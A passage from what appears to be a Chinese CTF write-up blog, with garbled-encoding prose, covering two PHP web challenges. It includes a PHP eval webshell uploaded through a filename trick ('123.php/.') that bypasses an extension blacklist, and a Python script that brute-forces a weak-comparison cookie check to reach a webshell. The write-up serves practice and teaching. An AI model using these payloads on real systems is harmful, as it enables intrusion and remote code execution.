class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;jSp&quot;</span>,<span class="string">&quot;jSpx&quot;</span>,<span class="string">&quot;jSpa&quot;</span>,<span class="string">&quot;jSw&quot;</span>,<span class="string">&quot;jSv&quot;</span>,<span class="string">&quot;jSpf&quot;</span>,<span class="string">&quot;jHtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;aSp&quot;</span>,<span class="string">&quot;aSpx&quot;</span>,<span class="string">&quot;aSa&quot;</span>,<span class="string">&quot;aSax&quot;</span>,<span class="string">&quot;aScx&quot;</span>,<span class="string">&quot;aShx&quot;</span>,<span class="string">&quot;aSmx&quot;</span>,<span class="string">&quot;cEr&quot;</span>,<span class="string">&quot;sWf&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$deny_ext</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">blacklist</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$filecontent</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!!!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345678910111213141516171819202122232425</span></span><br></pre></td></tr></table></figure>

<p>file_put_contentå‡½æ•°æœ‰ä¸€ä¸ªæ–‡ä»¶è§£æçš„æ¼æ´</p>
<blockquote>
<p>å½“ä¸Šä¼ <code>123.php/.</code>çš„æ—¶å€™ï¼Œfile_put_contentså‡½æ•°ä¼šè®¤ä¸ºæ˜¯è¦åœ¨123.phpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>.</code>çš„æ–‡ä»¶ï¼Œæœ€ç»ˆä¸Šä¼ åˆ›å»ºçš„æ˜¯123.php</p>
</blockquote>
<p>123.phpå†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:25045/&quot;</span></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:(<span class="string">&quot;123.php%2f.&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;123.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,files=file).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817140038899.png" alt="image-20240817140038899"></p>
<h2 id="ç»™ä½ shell"><a href="#ç»™ä½ shell" class="headerlink" title="ç»™ä½ shell"></a>ç»™ä½ shell</h2><p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817214950410.png" alt="image-20240817214950410"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240817215000531.png" alt="image-20240817215000531"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ea50473b-4923-4d2b-b3a8-7a54a9a40e5f.challenge.ctf.show/?view_source</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, <span class="variable">$arr</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">theFirstTimeSetCookie</span>() ) <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params"><span class="variable">$_f_g</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_g_r</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$_m_u</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_f_g</span>);</span><br><span class="line">    <span class="variable">$_h_p</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_m_u</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$_g_r</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_h_p</span>, <span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_i</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$_i</span> &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]) ? <span class="variable">$json</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>] : <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">7200</span> );</span><br><span class="line"><span class="title function_ invoke__">checkCookie</span>(<span class="variable">$json</span>) ? <span class="variable">$obj</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    (<span class="variable">$obj</span>[<span class="string">&#x27;secret&#x27;</span>] != <span class="variable">$flag_md5</span> ) ? <span class="title function_ invoke__">haveFun</span>(<span class="variable">$flag</span>) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$s</span>); <span class="comment">// æŠŠsä»¥:åˆ†å‰²æˆæ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, <span class="variable">$arr</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// æ£€æŸ¥$arr[1]æ˜¯å¦ç”±æ•°å­—å’Œè‹±æ–‡å­—æ¯A-Zè¿˜æœ‰&quot;ç»„æˆ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="title function_ invoke__">theFirstTimeSetCookie</span>() ) <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params"><span class="variable">$_f_g</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$_g_r</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$_m_u</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_f_g</span>); <span class="comment">// md5åŠ å¯†</span></span><br><span class="line">    <span class="variable">$_h_p</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_m_u</span>); <span class="comment">// è½¬æˆå¤§å†™</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$_g_r</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_h_p</span>, <span class="variable">$i</span>, <span class="number">1</span>);  <span class="comment">// ä»ç¬¬ä¸€ä½å¼€å§‹ï¼Œä¸€ä¸ªä¸€ä¸ªçš„å–</span></span><br><span class="line">        <span class="variable">$_i</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$_i</span>); <span class="comment">//è¿”å› $_i çš„ ASCIIå€¼ï¼š</span></span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$_i</span> &amp; <span class="number">0xC0</span>);  <span class="comment">// æŒ‰ä½ä¸è¿ç®—11000000   æ•°å­—éƒ½ä¼šå˜æˆ1è¾“å‡ºï¼Œè€Œå­—æ¯éƒ½ä¼šå˜æˆ0è¾“å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰æŒ‰ä½ä¸è¿ç®—çš„è¯ï¼Œå¯ä»¥æŠŠè¾“å‡ºçš„ASCIIå€¼è¿”å›æˆå­—ç¬¦ä¸²å†md5è§£å¯†ä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>]) ? <span class="variable">$json</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;secret&#x27;</span>] : <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">7200</span> );</span><br><span class="line"><span class="title function_ invoke__">checkCookie</span>(<span class="variable">$json</span>) ? <span class="variable">$obj</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"><span class="comment">// åˆ¤æ–­æœ‰æ— secret </span></span><br><span class="line"><span class="comment">// é€šè¿‡secretèµ‹å€¼ç»™$jsonï¼Œå†é€šè¿‡$jsonå»ºç«‹$obj</span></span><br><span class="line"><span class="comment">// json_decode() å°†jsonæ ¼å¼çš„æ•°æ®è½¬æ¢ä¸ºå¯¹è±¡ï¼Œæ•°ç»„ï¼Œè½¬æ¢ä¸ºæ•°ç»„è¦åŠ true</span></span><br><span class="line"><span class="comment">// jsonçš„secretéœ€è¦æ»¡è¶³ checkCookie($s) é‡Œé¢çš„æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    (<span class="variable">$obj</span>[<span class="string">&#x27;secret&#x27;</span>] != <span class="variable">$flag_md5</span> ) ? <span class="title function_ invoke__">haveFun</span>(<span class="variable">$flag</span>) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*è¦è®©ä¼ å…¥çš„secretä¸º $flag_md5ï¼Œè¿™é‡Œå°±å­˜åœ¨æ¼æ´äº†ï¼Œåˆ©ç”¨phpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨json_decode()è¿”å›&quot;&quot;é‡Œé¢çš„å†…</span></span><br><span class="line"><span class="comment">å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå°±ä¸èƒ½è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒäº†ï¼Œä½†æ˜¯å¦‚æœé‡Œé¢çš„å†…å®¹ï¼Œæ¯”å¦‚æ•°å­—ï¼Œæ²¡æœ‰è¢«&quot;&quot;æ‹¬èµ·æ¥ï¼Œè¿”å›çš„å°±æ˜¯ä¸ªintæ•´æ•°ï¼Œæ‰€ä»¥æ³¨æ„æŠŠ&quot;&quot;åˆ å»ï¼Œä¹Ÿ</span></span><br><span class="line"><span class="comment">å°±æ˜¯&#123;&quot;secret&quot;:123&#125;ï¼Œè¿™é‡Œå¼€å§‹æ²¡æ³¨æ„åˆ°è¿˜è¢«å‘äº†ï¼Œä¸€ç›´æ²¡æœ‰çˆ†ç ´å‡ºæ¥</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">url = <span class="string">&#x27;http://ea50473b-4923-4d2b-b3a8-7a54a9a40e5f.challenge.ctf.show/?give_me_shell=&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1000</span>)):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: <span class="string">f&#x27;secret=&#123;&#123;&quot;secret&quot;: <span class="subst">&#123;i&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;here is your webshell&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(headers)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240817221038792.png" alt="image-20240817221038792"></p>
<p>å¾—åˆ°webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">D:\python3.<span class="number">7</span>\python.exe C:\Users\<span class="number">31702</span>\Desktop\<span class="number">123</span>.py </span><br><span class="line"> <span class="number">12</span>%|â–ˆâ–        | <span class="number">115</span>/<span class="number">1000</span> [<span class="number">00</span>:<span class="number">02</span>&lt;<span class="number">00</span>:<span class="number">20</span>, <span class="number">42.35</span>it/s]</span><br><span class="line">&#123;<span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;secret=&#123;&quot;secret&quot;: 115&#125;&#x27;</span>&#125;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;<span class="keyword">real</span> easy checkin&lt;/title&gt;</span><br><span class="line">    &lt;link  href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&amp;display=swap&quot;</span>  rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            font-family: <span class="string">&quot;Inconsolata&quot;</span>, monospace;</span><br><span class="line">            text-align: center;</span><br><span class="line">            font-size: <span class="number">64</span>px;</span><br><span class="line">            vertical-align: middle;</span><br><span class="line">            user-select: none;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .flexmagic &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: <span class="number">90</span>%;</span><br><span class="line">            position: absolute;</span><br><span class="line"></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">        &#125;</span><br><span class="line">         *&#123;margin:<span class="number">0</span>px; padding:<span class="number">0</span>px;&#125;</span><br><span class="line">        .botCenter&#123;width:<span class="number">100</span>%; height:<span class="number">35</span>px; line-height:<span class="number">35</span>px; background:<span class="comment">#ffffff; position:fixed; bottom:0px; left:0px; font-size:14px; color:#000; text-align:center;&#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;https://gem-love.com/&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">botCenter</span>&quot;&gt;@é¢–å¥‡<span class="title">L</span>&#x27;<span class="title">Amore</span>&lt;/<span class="title">div</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&#x27;./?<span class="title">view_source</span>&#x27; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;<span class="title">button</span> <span class="title">hidden</span>&gt;&lt;/<span class="title">button</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flexmagic</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">id</span>=&quot;<span class="title">magic</span>&quot;&gt;<span class="title">I</span> <span class="title">prepared</span> <span class="title">a</span> <span class="title">webshell</span> <span class="title">for</span> <span class="title">you</span>&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">here</span> <span class="title">is</span> <span class="title">your</span> <span class="title">webshell</span>: <span class="title">w3b5HeLLlll123</span>.<span class="title">php</span>        &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> /<span class="title">flag</span>.<span class="title">txt</span>--&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">è¿›ç¨‹å·²ç»“æŸï¼Œé€€å‡ºä»£ç ä¸º 0</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<h2 id="moectfå‹‡é—¯é“œäººé˜µ"><a href="#moectfå‹‡é—¯é“œäººé˜µ" class="headerlink" title="moectfå‹‡é—¯é“œäººé˜µ"></a>moectfå‹‡é—¯é“œäººé˜µ</h2><p>ç®—æœ¯é¢˜</p>
